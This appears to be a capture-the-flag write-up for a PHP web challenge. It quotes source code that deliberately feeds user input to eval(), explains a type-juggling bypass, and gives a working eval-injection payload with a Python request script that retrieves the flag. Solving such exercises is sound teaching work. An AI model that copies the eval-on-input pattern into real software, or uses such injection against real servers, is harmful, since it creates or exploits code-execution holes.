# Simple PHP - CTF Writeup

**Challenge Name:** Simple PHP
**Category:** Web Exploitation
**Points:** 50
**URL:** http://38.60.200.116:8081


![](attachments/Pasted%20image%2020251130142857.png)

## Challenge
![](attachments/Pasted%20image%2020251130143006.png)
## Initial Reconnaissance

When accessing the challenge URL without parameters, the source code is revealed:

```php
<?php
error_reporting(0);
ini_set('display_errors', 0);

if(!isset($_GET['password']) || !isset($_GET['x']) || !isset($_GET['y'])){
    highlight_file(__FILE__);exit();
}

include('flag.php');
$password = $_GET['password'] ?? '';
$x = $_GET['x'];
$y = $_GET['y'];

if (preg_match($pattern, $password)) {
    echo 'invalid characters detected';
    exit();
}

if (preg_match('/[A-Z.;a-z()\\\\]/', $password) === 1) {
    echo 'Are you KyawGyi?';
    exit();
}

if(eval("return empty($password);") && $x == $y && strlen($x) != strlen($y) && strlen($x) == '1337' && strlen($x) === strlen($password)){
    echo $flag;
}
?>
```

## Analysis

The challenge requires us to bypass multiple conditions to retrieve the flag:

### Condition Breakdown

1. **Three GET parameters required:** `password`, `x`, `y`

2. **Password Constraints:**
   - Must pass undefined `$pattern` check (this is a red herring - undefined variable = NULL)
   - Must NOT match regex: `/[A-Z.;a-z()\\]/`
     - Blocked: uppercase letters, lowercase letters, dots, semicolons, parentheses, backslashes
   - Must make `eval("return empty($password);")` return `true`
   - Must have `strlen($password) === 1337`

3. **X and Y Constraints:**
   - `$x == $y` (loose comparison - must be equal)
   - `strlen($x) != strlen($y)` (strict comparison - different lengths)
   - `strlen($x) == '1337'` (loose comparison - length equals string '1337')
   - `strlen($x) === strlen($password)` (strict comparison)

### The Contradictions

At first glance, these conditions seem contradictory:
- How can `$x == $y` be true while `strlen($x) != strlen($y)`?
- How can a 1337-character password make `empty()` return true?

## Solution Strategy

### Part 1: Solving X and Y (Type Juggling)

PHP's loose comparison (`==`) performs type juggling. Numeric strings are compared by their numeric value:

```php
"0000000" == "0"  // TRUE (both evaluate to 0)
strlen("0000000") != strlen("0")  // TRUE (7 != 1)
```

**Solution:**
- `x = "000...000"` (1337 zeros)
- `y = "0"` (single zero)

This satisfies all X/Y conditions:
- `$x == $y` → `0 == 0` → ✓ TRUE
- `strlen($x) != strlen($y)` → `1337 != 1` → ✓ TRUE
- `strlen($x) == '1337'` → `1337 == 1337` → ✓ TRUE
- `strlen($x) === strlen($password)` → Both must be 1337

### Part 2: Solving Password (Eval Injection)

We need a 1337-character string that makes `empty()` return true when evaluated.

**Key Insight:** The password is directly interpolated into `eval()`:
```php
eval("return empty($password);")
```

We can inject PHP code that evaluates to an "empty" value!

**Approach:**
1. Use `0^0` (bitwise XOR) which evaluates to `0`
2. `empty(0)` returns `true` in PHP
3. Use multi-line comments `/* */` to pad to 1337 characters

**Payload Structure:**
```
0^0/* [1330 characters of padding] */
```

This becomes:
```php
eval("return empty(0^0/* padding */);")
```

Which evaluates to:
```php
return empty(0);  // TRUE
```

### Character Constraints Check

Our payload uses:
- `0` - digits (allowed)
- `^` - caret (allowed)
- `/` - slash (allowed)
- `*` - asterisk (allowed)

None of these match `/[A-Z.;a-z()\\]/` ✓

## Exploitation

### Final Payload

```python
import urllib.parse
import requests

password = "0^0/*" + "0" * 1330 + "*/"  # Total: 1337 chars
x = "0" * 1337  # 1337 zeros
y = "0"  # Single zero

url = f"http://38.60.200.116:8081/?password={urllib.parse.quote(password)}&x={x}&y={y}"

print(url)

response = requests.get(url)

print(response.status_code)
print(response.text)
```

### Manual URL Construction

```
http://38.60.200.116:8081/?password=0%5E0%2F*000...000*%2F&x=000...000&y=0
```

Where:
- `password` = `0^0/*` + 1330 zeros + `*/` (1337 total)
- `x` = 1337 zeros
- `y` = single zero

## The Result

```
NOVA_CTF{1_kN0w_pHp_w3ll_c0855cc0d2d12e6b7af3375d9fa4e8a2}
```


```
python3.13 get_flag.py 
http://38.60.200.116:8081/?password=0%5E0/%2A0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000%2A/&x=00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&y=0
200
NOVA_CTF{1_kN0w_pHp_w3ll_c0855cc0d2d12e6b7af3375d9fa4e8a2}.
```


![](attachments/Pasted%20image%2020251130143737.png)

